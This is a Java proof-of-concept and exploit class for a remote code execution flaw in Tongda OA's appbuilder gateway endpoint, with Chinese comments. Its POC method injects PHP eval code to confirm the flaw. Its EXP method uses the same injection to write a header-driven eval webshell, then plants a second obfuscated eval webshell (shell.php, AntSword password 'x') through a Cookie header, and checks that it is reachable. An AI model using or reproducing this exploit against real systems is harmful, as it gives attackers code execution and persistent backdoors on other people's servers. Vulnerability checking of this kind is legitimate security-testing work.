package poc;

import com.github.kevinsawicki.http.HttpRequest;

import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class TongdaOA_gatewayUplaod {
    private String url;//定义漏洞url
    private String path;//定义漏洞path
    private String webshell;//定义webshell内容

    public String getUrl() {
        return url;
    }

    public void setUrl(String url) {
        this.url = url;
    }

    public String getPath() {
        return path;
    }

    public void setPath(String path) {
        this.path = path;
    }

    public String getWebshell() {
        return webshell;
    }

    public void setWebshell(String webshell) {
        this.webshell = webshell;
    }

    //poc,判断是否存在漏洞
    public boolean POC(){
        //漏洞path路径
        path = "/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22ZWNobyB2dWxuX3Rlc3Q7%22)))%3B/*&id=19&module=Carouselimage";

        //定义正则表达式
        String regex = "vuln_test";
        Pattern pattern = Pattern.compile(regex);

        //发起http请求，执行echo vuln_test;命令
        HttpRequest request = HttpRequest.get(url + path)
                .trustAllCerts()
                .trustAllHosts()
                .connectTimeout(5000)
                .readTimeout(5000);
        //获取响应内容，通过正则表达式查找响应中是否存在vuln_test字符
        Matcher matcher = pattern.matcher(request.body());
        return matcher.find();
    }

    //exp,上传websgell
    public boolean EXP(){
        //定义漏洞path路径，写入无参webshell
        path = "/general/appbuilder/web/portal/gateway/getdata?activeTab=%e5%27,1%3d%3Efwrite(fopen(%222.php%22,%22w+%22),%22%3C?php%20eval(next(getallheaders()));%22))%3b/*&id=266&module=Carouselimage";
       //发起http请求，写入无参webshell
        HttpRequest request = HttpRequest.get(url+path)
                .trustAllHosts()
                .trustAllCerts()
                .connectTimeout(5000)
                .readTimeout(5000)
                .header("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36");
        request.code();

        //无参webshell路径
        path = "/general/appbuilder/web/2.php";
        //webshell内容
        webshell="<?php class G948nsWJ { public function __construct(\\$HvOQv){ @eval(\\\"/*Zrm5oN973g*/\\\".\\$HvOQv.\\\"/*Zrm5oN973g*/\\\"); }}new G948nsWJ(\\$_REQUEST['x']);?>";
        //通过无参webshell写入蚁剑shell，蚁剑密码为x
        HttpRequest upfileRequest = HttpRequest.get(url + path)
                .trustAllCerts()
                .trustAllHosts()
                .connectTimeout(5000)
                .readTimeout(5000)
                .header("User-Agent","Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36")
                .header("Accept-Encoding","gzip, deflate")
                .header("Accept","text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8")
                .header("Connection","close")
                .header("Cookie", "file_put_contents(\"shell.php\",\"" + webshell + "\");");
        upfileRequest.code();

        path="/general/appbuilder/web/shell.php";//蚁剑地址
       HttpRequest file =  HttpRequest.get(url+path)
                .trustAllCerts()
                .trustAllHosts()
                .connectTimeout(5000)
                .readTimeout(5000);
        return file.code()==200;
    }
}
